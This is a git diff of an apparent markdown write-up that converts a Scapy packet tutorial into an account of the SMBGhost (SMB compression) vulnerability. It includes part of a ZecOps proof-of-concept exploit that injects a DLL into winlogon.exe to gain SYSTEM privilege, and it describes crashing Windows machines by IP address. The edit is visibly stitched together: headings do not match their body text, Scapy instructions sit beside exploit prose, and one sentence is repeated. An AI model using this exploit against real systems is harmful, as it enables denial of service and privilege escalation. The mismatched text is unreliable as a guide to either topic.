@@ -56,7 +56,7 @@ The below POC created by zecops research team illustrates how the bug can be exp
 
 
 
-### Create a simple packet header 
+###  vulnerability root causes
 Creating a network packet is one of the main features of Scapy. Initially, I will create a simplest header of a packet, which only contains source ip address and destination ip address.                                           
  
     typedef struct _COMPRESSION_TRANSFORM_HEADER
@@ -121,10 +121,9 @@ This could be a crucial vulnerability because we can use this to crash a specifi
 
 
 
-### Send and receive packets (sr)
-One of the most important segments in network is sending and receiving the packets. The sr() function is how we can implement them. The function will return both answered and unanswered packets. Below is a demonstration on how we use this function to send and receive a ICMP packets, as well as to decode the received the packets. 
+### Vulnerability Exploit
+This could be a crucial vulnerability because we can use this to crash a specific windows system by an IP address. The code here was created by ZECOPS research team, which customized a network packet header size and set up the offset in a token and exploit the vulnerability. The core part of the source code is shown as below.
 
->>> 
 def exploit():
    """
    Exploits the bug to escalate privileges.
@@ -151,7 +150,8 @@ def exploit():
    subprocess.call(['Injector.exe', '--process-name', 'winlogon.exe', '--inject', dll_path], stdout=open(os.devnull, 'wb'))
 
 And when the SMB decompressed the header, it will crash the windows system at the beginning by bule screen of death as below.
-![blue screen of death](https://en.wikipedia.org/wiki/Blue_screen_of_death#/media/File:Bsodwindows10.png)
+![blue screen of death](https://user-images.githubusercontent.com/59459399/111933682-545c6180-8a96-11eb-8095-cea3bfcd5999.png)
+
 
 But if we keep trying the exploit several times, we can get the system/authority privilege.
 
